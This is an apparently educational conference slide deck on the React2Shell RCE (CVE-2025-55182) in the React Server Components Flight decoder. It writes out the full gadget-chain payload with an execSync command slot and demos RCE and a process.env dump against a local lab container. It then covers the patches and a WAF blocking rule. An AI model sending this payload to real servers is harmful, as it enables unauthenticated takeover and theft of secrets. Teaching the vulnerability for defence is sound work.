---
title: React2Shell RCE Vulnerability
sub_title:  CVE-2025-55182
event: Vehikl Lightning Talks
date: 02-27-2026
author: Cole Foster
theme:
  name: catppuccin-mocha
options:
  end_slide_shorthand: true
---

Intro
===
# CVE-2025-55182 — **React2Shell**
### Unauthenticated RCE via Next.js Server Actions

```
Affects:   react-server-dom-webpack,           19.0, 19.1.0, 19.1.1, 19.2.0  
           react-server-dom-parcel, 
           react-server-dom-turbopack
        
           Next.js                             16.0.0 – 16.0.6
            
Vector:    Unauthenticated HTTP POST 
CVSS:      10.0 - Critical
Impact:    Full server-side code execution
```

---

JS Fundamentals: constructor chaining
===
## Every object leads to `Function`

<!-- column_layout: [2, 1] -->

<!-- column: 0 -->

```javascript +exec +id:constructor_chain
const obj = {};
console.log(obj.constructor.name);
console.log(obj.constructor.constructor.name);
console.log(obj.constructor.constructor === Function);
```

<!-- column: 1 -->

<!-- snippet_output: constructor_chain -->

<!-- reset_layout -->

<!-- pause -->

`Function` takes a **string** and returns an executable function:

<!-- column_layout: [2, 1] -->

<!-- column: 0 -->

```javascript +exec +id:function_eval
const F = {}.constructor.constructor;
console.log(F("return 1+1")());
console.log(F("return process.version")());
```

<!-- column: 1 -->

<!-- snippet_output: function_eval -->

<!-- reset_layout -->

<!-- pause -->

**Two property hops from any object → dynamic code execution.**

---

JS Fundamentals: thenables
===
## Duck-typed Promises

`await` doesn't check `instanceof Promise`.
Any object with a `.then` method is auto-called:

<!-- column_layout: [2, 1] -->

<!-- column: 0 -->

```javascript +exec +id:thenable
const sneaky = {
  then(resolve) {
    console.log(".then() called!");
    resolve("done");
  }
};

///Promise.resolve(sneaky).then(v => console.log("resolved:", v));
Promise.resolve(sneaky).then(v =>
  console.log("resolved:", v)
);
```

<!-- column: 1 -->

<!-- snippet_output: thenable -->

<!-- reset_layout -->

<!-- pause -->

**Control `.then` on an object → control what `await` does.**

---

Context: Server Actions
===
## Server Actions

Server-side functions callable directly from the browser:

```typescript
"use server"
async function submitOrder(item: string, qty: number) {
  await db.insert({ item, qty })
  return { ok: true }
}
```

```tsx
<form action={submitOrder}>…</form>
```

<!-- pause -->

On submit the browser POSTs to **the page URL** (any route).
Next.js picks the function via the `Next-Action` header.
Arguments are serialized in React's **Flight** format.

---

Context: RSC Flight protocol
===
## RSC Flight — The Wire Format

```
POST /             HTTP/1.1
Next-Action:       <sha256-hash>
Content-Type:      multipart/form-data
```

The body is numbered **chunks** with `$`-prefixed cross-references:

```
Field "0":  ["$1"]
Field "1":  {"item":"widget","vendor":"$2:vendorName"}
Field "2":  {"vendorName":"Vehikl"}
```

Resolves to: `[{item: "widget", vendor: "Vehikl"}]`

---

## Flight — How References Resolve

`$2:vendorName` → get chunk 2, access key `"vendorName"`:

<!-- column_layout: [2, 1] -->

<!-- column: 0 -->

```javascript +exec +id:flight_resolve
const chunks = {
  2: { vendorName: "Vehikl" }
};
const ref = "2:vendorName".split(":");
let result = chunks[ref[0]];
for (let i = 1; i < ref.length; i++) {
  result = result[ref[i]];
}
console.log(result);
```

<!-- column: 1 -->

<!-- snippet_output: flight_resolve -->

<!-- reset_layout -->

<!-- pause -->

`result = result[ref[i]]` — **raw bracket access, no validation.**

---

## Flight — The Bug

`"vendorName"` is an own property. What about `"constructor"`?

<!-- column_layout: [2, 1] -->

<!-- column: 0 -->

```javascript +exec +id:flight_bug
const obj = { vendorName: "Vehikl" };

console.log(obj["vendorName"]);
console.log(obj["constructor"].name);
console.log(
  obj["constructor"]["constructor"].name
);
```

<!-- column: 1 -->

<!-- snippet_output: flight_bug -->

<!-- reset_layout -->

<!-- pause -->

The decoder doesn't distinguish own vs inherited.

`$1:constructor:constructor` → `Function`. **That's the entire bug.**

---

## Live — Normal Request

```bash +exec
cat normal-request.hurl
```

<!-- pause -->

```bash +exec
hurl --variable host="${HOST:-http://localhost:3000}" \
     --no-color \
     normal-request.hurl 2>&1
```

_Expected failure — the action hash is fake._

---

The Gadget Chain
===
## The Payload

Two multipart fields. No custom classes, no memory corruption.

```json
Field "0": {
  "then":      "$1:__proto__:then",
  "status":    "resolved_model",
  "reason":    -1,
  "value":     "{\"then\":\"$B0\"}",
  "_response": {
    "_prefix":   "<COMMAND>;//",
    "_formData": { "get": "$1:constructor:constructor" }
  }
}

Field "1": "$@0"
```

---

## Step 1 — Become a thenable

```
"then":  "$1:__proto__:then"        Field "1":  "$@0"
```

`"$@0"` is a self-reference — chunk 1 points back to chunk 0's raw object.

The decoder resolves `$1:__proto__:then`:

<!-- column_layout: [2, 1] -->

<!-- column: 0 -->

```javascript +exec +id:step1
///// In React, Chunk.prototype.then exists.
///// The decoder walks: obj.__proto__.then
///// → assigns Chunk.prototype.then to our obj.
const chunk0 = { fake: true };
const proto = chunk0["__proto__"];
console.log(typeof proto);
console.log(typeof proto.constructor);
///// Chunk 0 gains a real .then
///// → await calls it automatically
```

<!-- column: 1 -->

<!-- snippet_output: step1 -->

<!-- reset_layout -->

Chunk 0 gains a real `.then` → `await` calls it automatically.

---

## Step 2 — Trick initialization

```
"status":  "resolved_model"
```

`Chunk.prototype.then` checks `this.status`:

```javascript
// Inside Chunk.prototype.then (simplified):
if (this.status === "resolved_model") {
  initializeModelChunk(this);
}
```

<!-- pause -->

`initializeModelChunk` parses `this.value` using `this._response`.

Both are attacker-controlled.

---

## Step 3 — Replace `_formData.get` with `Function`

```
"_formData": { "get": "$1:constructor:constructor" }
```

<!-- column_layout: [2, 1] -->

<!-- column: 0 -->

```javascript +exec +id:step3
const obj = {};
let result = obj;
result = result["constructor"];
result = result["constructor"];
console.log(result.name);
console.log(result === Function);
```

<!-- column: 1 -->

<!-- snippet_output: step3 -->

<!-- reset_layout -->

<!-- pause -->

`_formData.get` is now `Function` — takes a string, returns executable code.

---

## Step 4 — Trigger via `$B`

```
"value":    "{\"then\":\"$B0\"}"
"_prefix":  "process.mainModule.require('child_process').execSync('id');//"
```

`$B` triggers the Blob handler:

```javascript
case "B":
  return response._formData.get(response._prefix + id);
```

<!-- pause -->

With our substitutions:

<!-- column_layout: [2, 1] -->

<!-- column: 0 -->

```javascript +exec +id:step4
const _prefix = "console.log('RCE!');//";
const fn = Function(_prefix + "0");
fn();
////// On a real server:
////// Function("process.mainModule
//////   .require('child_process')
//////   .execSync('id');//0")()
```

<!-- column: 1 -->

<!-- snippet_output: step4 -->

<!-- reset_layout -->

---

## Attack Surface

Any `Next-Action` header triggers deserialization — **before**
action validation, middleware, or authentication.

```
POST /                          ← any route
Next-Action: x                  ← any value
Content-Type: multipart/form-data
```

No account. No CSRF token. No knowledge of the target app.

---

Live Demo
===

## Live — Step 1: Probe

```bash +exec
cat exploit-1-probe.hurl
```

<!-- pause -->

```bash +exec
hurl --variable host="${HOST:-http://localhost:3000}" \
     --no-color \
     exploit-1-probe.hurl 2>&1
```

---

## Live — Step 2: RCE

Write `id` output to `/tmp/pwned.txt` — runs **during deserialization**.

```bash +exec
cat exploit-2-rce.hurl
```

<!-- pause -->

```bash +exec
hurl --variable host="${HOST:-http://localhost:3000}" \
     --max-time 10 \
     --no-color \
     exploit-2-rce.hurl 2>&1
```

<!-- pause -->

```bash +exec
docker exec react2shell-app cat /tmp/pwned.txt 2>&1 || echo "(adjust container name)"
```

---

## Live — Step 3: Dump `process.env`

```bash +exec
cat exploit-3-env-dump.hurl
```

<!-- pause -->

```bash +exec
hurl --variable host="${HOST:-http://localhost:3000}" \
     --max-time 10 \
     --no-color \
     exploit-3-env-dump.hurl 2>&1
```

<!-- pause -->

```bash +exec
docker exec react2shell-app cat /tmp/env_dump.json 2>&1 | head -20 || echo "(adjust container name)"
```

---

The Patch
===
## Fix 1 — Own-property check

```javascript
// BEFORE — walks prototype chain
for (let i = 1; i < path.length; i++) {
  parentObject = parentObject[path[i]];
}

// AFTER — blocks inherited properties
for (let i = 1; i < path.length; i++) {
  if (!hasOwnProperty.call(parentObject, path[i])) {
    throw new Error("Invalid reference");
  }
  parentObject = parentObject[path[i]];
}
```

`$1:constructor:constructor` → dead. `"constructor"` isn't an own property.

---

## Fix 2 — Unforgeable response lookup

```javascript
// BEFORE — reads _response from the chunk object
value = reviveModel(chunk._response, ...);

// AFTER — uses a Symbol (cannot exist in JSON)
const RESPONSE_SYMBOL = Symbol("response");
const response = chunk.reason[RESPONSE_SYMBOL];
```

Fake chunks can never provide a fake `_response`.

<!-- pause -->

## Fix 3 — Type validation on `.then`

```javascript
// BEFORE — no check
listener(value);

// AFTER
if (typeof listener === "function") listener(value);
```

<!-- pause -->

**Any single fix breaks the chain. The patch applied all three.**

---

Summary
===
## Summary

**3 requests. No auth. No account. No knowledge of the target app.**

<!-- pause -->

**Root cause** — the Flight decoder constructs objects from untrusted input:

```
obj[key]                           walks prototype chain unchecked
obj.constructor.constructor        always reaches Function
Function(string)                   eval with no imports or setup
await { then: fn }                 auto-calls .then() (duck-typed)
```

<!-- pause -->

**Remediation**

- ✅ Upgrade to **Next.js ≥ 16.0.7** / **React ≥ 19.1.0**
- ✅ WAF: block `__proto__` and `constructor:constructor` in POST bodies
- ✅ Runtime: deny `process.mainModule` access in server action context
